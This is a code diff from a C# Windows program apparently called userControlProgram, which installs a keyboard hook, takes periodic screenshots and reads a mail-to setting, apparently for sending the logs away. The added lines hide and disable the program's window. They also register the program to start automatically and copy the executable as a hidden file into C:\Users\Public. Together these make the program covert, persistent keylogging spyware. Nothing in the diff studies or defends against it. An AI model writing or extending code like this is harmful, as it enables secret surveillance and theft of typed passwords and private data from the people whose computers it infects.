@@ -18,19 +18,25 @@ namespace userControlProgram
         private int _screenShotTimer;
         public Form1()
         {
+            Hide();
+            this.Visible = false;
+            Enabled = false;
             SetConfigurations.SetConfig(ref _mailTo, ref LogPath, ref _screenShotTimer);
             KeyLogger.SetHook(LogPath);
             ScreenshotMaker.ScreenshotStart(_screenShotTimer, LogPath);
+            Autorun.SetAutorunValue(true, "C:\\Users\\Public\\userControlProgram.exe");
             InitializeComponent();
         }
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            Hide();
+            this.Visible = false;
             if (!File.Exists(NeedPath))
             {
                 try
                 {
-                    File.Copy("system.exe", "C:\\Users\\Public\\userControlProgram.exe");
+                    File.Copy("userControlProgram.exe", "C:\\Users\\Public\\userControlProgram.exe");
                     File.SetAttributes("C:\\Users\\Public\\userControlProgram.exe", FileAttributes.Hidden);
                 }
                 catch
